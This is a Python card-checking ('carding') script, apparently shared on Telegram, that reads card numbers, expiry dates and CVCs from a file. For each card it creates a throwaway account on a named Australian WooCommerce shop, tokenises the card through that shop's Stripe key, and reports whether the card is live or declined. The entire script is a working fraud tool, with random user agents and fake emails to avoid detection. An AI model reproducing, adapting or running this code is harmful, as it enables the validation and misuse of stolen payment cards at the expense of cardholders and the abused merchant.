#THIS SCRIPT IS  BY @HQCCZ
#JOIN TELEGRAM CHANNEL @HQCCZ FOR MORE, CREDIT STEALERS WILL BE CONSIDERED AS GAY
import requests,random,re,uuid,os,time
from user_agent import generate_user_agent
from colorama import Fore
from tqdm import tqdm
from rich.panel import Panel
from rich import print as PR
for x in tqdm(range(100),total=100,colour='green',desc="Progress"):
	time.sleep(0.03)
os.system('clear')
blue=Fore.BLUE;green=Fore.LIGHTGREEN_EX;red=Fore.RED;white=Fore.WHITE;yellow=Fore.YELLOW;black=Fore.BLACK;light_blue=Fore.LIGHTBLUE_EX;purble=Fore.LIGHTMAGENTA_EX;Baby_Blue=Fore.LIGHTCYAN_EX
OTP_Cards = []
cards = []
file=open('card.txt',"+r")
os.system("clear")
Text = """\n Gateway : Stripe \t Dev : @FNxOwner\n Amount : Auth\t \tJoin @fn_network_back FOR MORE\n Type : Auth \t\t Channel : https://t.me/fn_network_back"""
width = 70
title_length = len("~> | Details | <~            ")
padding = (width - title_length) // 2
title_padded = " " * padding + "~> | Details | <~                   " + " " * (width - title_length - padding)
PR(Panel(Text, width=width, title=title_padded, style="bold", border_style="underline", title_align="center"))
print("")
for P in file.readlines():
	n = P.split('|')[0]
	mm = (P.split('|')[1])
	if "0" not in mm and int(mm) <=9:
		mm = f"0{mm}"
	yy = P.split('|')[2]
	if "20" in yy:
		yy = yy[2:]
	cvc = P.split('|')[3].replace('\n', '')
	P = P.replace('\n', '')
	user=generate_user_agent()
	GUID = uuid.uuid4()
	MUID = uuid.uuid4()
	SID = uuid.uuid4()
	acc = ''.join(random.choices('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM',k=random.randint(5,12)))
	r = requests.session()
	headers = {
    'authority': 'thestrawberrythief.com.au',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7',
    'cache-control': 'max-age=0',
    'referer': 'https://thestrawberrythief.com.au/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,}
	response = r.get('https://thestrawberrythief.com.au/my-account/',  headers=headers)
	reg_nonce = re.findall('name="woocommerce-register-nonce" value="(.*?)"',response.text)[0]
	headers = {
    'authority': 'thestrawberrythief.com.au',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://thestrawberrythief.com.au',
    'referer': 'https://thestrawberrythief.com.au/my-account/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,}
	data = {
    'email': f'{acc}@gmail.com',
    'wc_order_attribution_source_type': 'typein',
    'wc_order_attribution_referrer': '(none)',
    'wc_order_attribution_utm_campaign': '(none)',
    'wc_order_attribution_utm_source': '(direct)',
    'wc_order_attribution_utm_medium': '(none)',
    'wc_order_attribution_utm_content': '(none)',
    'wc_order_attribution_utm_id': '(none)',
    'wc_order_attribution_utm_term': '(none)',
    'wc_order_attribution_utm_source_platform': '(none)',
    'wc_order_attribution_utm_creative_format': '(none)',
    'wc_order_attribution_utm_marketing_tactic': '(none)',
    'wc_order_attribution_session_entry': 'https://thestrawberrythief.com.au/',
    'wc_order_attribution_session_start_time': '2024-08-10 15:19:15',
    'wc_order_attribution_session_pages': '8',
    'wc_order_attribution_session_count': '1',
    'wc_order_attribution_user_agent': user,
    'woocommerce-register-nonce': reg_nonce,
    '_wp_http_referer': '/my-account/',
    'register': 'Register',}
	response = r.post('https://thestrawberrythief.com.au/my-account/', headers=headers, data=data)
	headers = {
    'authority': 'thestrawberrythief.com.au',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7',
    'referer': 'https://thestrawberrythief.com.au/my-account/payment-methods/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,}
	response = r.get('https://thestrawberrythief.com.au/my-account/add-payment-method/', headers=headers)
	nonce = re.findall('add_card_nonce":"(.*?)",',response.text)[0]
	pk = re.findall('"key":"(.*?)"',response.text)[0]
	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,}
	data = f'type=card&billing_details[name]=+&billing_details[email]={acc}%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid={GUID}&muid={MUID}&sid={SID}&payment_user_agent=stripe.js%2F8a1c35bc56%3B+stripe-js-v3%2F8a1c35bc56%3B+split-card-element&referrer=https%3A%2F%2Fthestrawberrythief.com.au&time_on_page=18014&key={pk}&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoicFIrNktqZ0t4TEJjL3BLTDNDelIyRG5xdm84MitSVWRJNkZJSnRyNW5nOGZKWFEvRjl5OHR4NmZtNmloMFBlSU1nNzcwZ2lySVRLbzliV2VlckhiYUhEeUtMSXhxek1NZ0h4NFphdEpjVThOSHpwdDJVeDBYZEJadTZYS3Z2T01SNDZROWo4VFBURkRLeWhwUVptSkorMDkvRldNbnlyMmpiQXBud0QvUkU2ZFMvbU5QM21Gek52dEhBdE85N2VVbDloSUEzZGhjM3NidVREZGNyaGo3UXl0UGNuVmNZNXFJZkhTZDRaOVpiNGQyUmpnaUFxRkJJTndzWTVuNmxrbnhGVDJHMlkyREtXNE12TmlLTEQ2RGQ4SWlGcXpFdG9ZMldZek9jaEd3dHV5by9RU3kzZERPeWhnOXplZ0tGekkzaTVhNi9kOEpmT1JWTmthZkE3bXNZTWd3ZVpGSGNrTDhqd0FOZlNKRmhUdGY5aFppTTNJY094WXdqSUg3dHN6ZjRLSWFhWklVWXBOUTBYT3FsT3N2TmNwWTE2U3JtYnRicm43Rk8wUE1HajJibmloQVF5YWhIMTdlR1I3OXd6Z0M2SGw4eFhBOEVhUjRGS3MrVGk1K2M4TDl3UzgwRFZOSFkvQWlva054amdBVGJiZXJ1dDZheVh5U0o4a2pwNS9RbEdqTGF4UUthWjBoNTl4V2Z2K21LVVJNcys5bmNMNm5NNHJSVFdDdXpoVkttbmpFSm1ySlhiNER6SjhWWVBjd1VSL3ZBeXZ5OEVPcmtvZElxbkhyMjVTd3QvR0NMdkZ6cXhkSnkzTVZrdEFRZWJjZkQwZUxEb20yWlEycitZb3B1N2V4SEJ2R2VIY2VVSUh5czUxOXRZNkZFQ1hiV0RxeGd1eXQ0bkt1U2ZtK21nMXJjUlZUWUx6S3dKd3NJcUZ4MXNxTjVyVlVhZlQxS2JmdEVzR3QvVnRlYjdNcVVCSG8rb2xXcm0zemhyd3Z1RlR4U3ByeFNvZkFKV2szRnoreW5xYXdaNTRNUjZzdjBITkd2ZytFRmZjeWxxblhNVXUwZ1RySVJxQUZxZWtWbUphMkFGWXBTMENVNzJEL0dITThFZzh2WitZc1MvU0Q3cGFTMWltRXNKcTl2VThYcm9MaFNVaGxWV25wcVZrUi9sVWtmM2dsVHdQeXFReHlBdkZUWnh6YjNqVjRzSTNEVFU4QVdCYVNFYkpFa3U3YVBpYXEwZk52UnJCamw2UTRMSmdmYjY4YW04blRXSmZUTnl3Y09CRURsVXJQUVRHSHluT3BxV2MvRHVoU0pzdEZFTk43dWZObzhLZDBieVR1a3Yzb2hjc0dTVjZWTDNoeDlJQ094RHNtZVBZQW5teFVvQnJnQXVzUW5hUWdGNFpwV0p1VElQNGhZaDdGYko3WHVuVmtra1plMXkvTksxOEFQVHdQamkrV1BYdjhVRE5pUWk4SU5TNTZ1a1lJZlR5ekt5cjQ5cXg2ZzRCbHkvSzJPK2dzMG5FMjNpUW5EeTdwZmp0RjRVM1FiQjdCckJNc3p6QVVCNElVdm9HQjR1UjhKdmxlaEFsVTBjRDRWTk1BZ3ZId2VoTnlselg2MjhIZ3phakw0TGh2cDI4aGE3cm1LbnJmTkdBL0tsSTdNWkV1cHJKVUc1YlhwZ1YrcUJwMzlIVGk5MFBZVEtNU0NzL1o0S2hNMGc0bjVvSWhUQlFYamg1MDFQdVR5WUd3Wkc4RTFhbjlSUHU3cXdjelpzWmZTZ3o3TnpFcjQweUppVGkvYjZIUCt4K2J4T2FqNERPbEpYZXFkZWdYN3EzdzV1Ky9GWE5QSTRLb3l2TlIyVnlRZDA3QXNiUGxmWWpQSlBhUWFJTTd6OVN0T1lHUG5yd2NWTFYweUVZeHlPaVM3VlBhWE43cFkzaEMyejJJVm95T09SK0dHYlg4RWtzelRvVHZLc3VmUmFFL3hWQ0hlTWpPSnQ1SDVxZk84azFkT2VHbnZBbVRIQmpENkxwNnlDdnVNclBOWjVzMzJrVWQwQmQ4M1NZb0hWb2hWWkpqeFdHNXNjOHlaMDlhZWpydEdFUDlwMG1WT1JhTkVSY2RudlZkaU9iRytCY3JJRTlWZlhXcXdLVmY1T1d2NjJ4R3dQNEp4QlpwaC82cU83SFN3WUx2ZnE3NDBqd2JKeVRwSWRFS21hVjNJL0hVNWpsQXFkT2MvMHNTVUlob3hkK0htYTJKM2w4T0hCaVo3SXVPZkV0RWtwUnhtQytuYmxmY2NSY1F6YUowMWRmdGhPTmtCcnYzS2lzVGJZS2N2VXRrYkVmZElLTUdxbDIyclhSanViVHF4d3RBS3VZMzFiZnM1N3d3VkZrL0ZPYkhjZHBwRkptV3RmUlQyd295c3NrZGt4OXJ6RDUvWW4xemtiWFczZGN3U1lscml4Z2FRaXQ1MGwrWjUwTW81aFRGUkNxQ09Lck41MEZVbmFLcHJaTml5L3ZOOUZTcmNBVFNNZ0MvSmVOazlxMjF3UVNVOUptd2JTMTJGODVCQ01SU2FzWG9Ba0RIU2daOWxjTGNWaVFuQnFWNk54aE1HVlFPWHRTZlhKcWl4b2dtRW9vYzdKQk9tU21URUIzYWVDTkcrWDJDMGNWeDhmOU55a0JGL1g2c2dmYVI1WnNwNlQyanNJanUrSUpPR0llSmZDczNGcDAzRkVGWUJqSE4weW9tUjRpYWlIMWN3R2RUdVFVaXRTL3Ntczh2THhPaEErNWtjVzFoZUozV0VZcjZINUczKzRIZ253TE9sa3l0WnJZYUNPd2JveXVYTnY4ZE1yUWZUTUdLSVBsc1ZabmxrUXpYc2JVSmUvSzNNQ05MY0pQYWh3VS9YRURSR25ML2lZZHpzWGtRNWdCdFBUS1lpY2pkelVGbGY1MUhHcXRuYmNSV2V2ZiIsImV4cCI6MTcyMzMwNDQ4MCwic2hhcmRfaWQiOjUzNTc2NTU5LCJrciI6IjYzZDRjMDUiLCJwZCI6MCwiY2RhdGEiOiJRUW14dGFBZG8yQmNOME5HRkY2YktoNysvSnVyQ1JtRmNQOWYrdG5OQS9QYmdZMkE2S1FmNEYrbWgvQXJoSjJxQ1N1bnhBdlY4MlJ4eGVWaWtvWXltaUcrWFhMZHZ1NTg5Y3F2Vmh5bFhUclVxeHpta3BsbGZ3WXdkWmQxRnJ4VE1Pd1E5TGZvZEtLQXlndWhla0gzUzVvR0c5Ry9HSUZsMTFzNDYrUXVtUE9GbThlbGtoelkranBxNGNLRGUxT2tyUTB6RW5zT2J6emRVaTFsIn0.x-lpV-VLLziSrvuIHiRMduFHY_DZURmrNFMqjYO1xWw'

	response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()["id"]
	headers = {
    'authority': 'thestrawberrythief.com.au',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://thestrawberrythief.com.au',
    'referer': 'https://thestrawberrythief.com.au/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',}
	params = {
    'wc-ajax': 'wc_stripe_create_setup_intent',}
	data = {
    'stripe_source_id': pm,
    'nonce': nonce,}
	response = r.post('https://thestrawberrythief.com.au/', params=params, headers=headers, data=data)
	state = response.json()["status"]
	if "success" in state:
		msg = "Successfuly Added ✅"
	else:
		msg = "Declined ❌"
	print(f"~~> {n}|{mm}|{yy}|{cvc} : {msg}")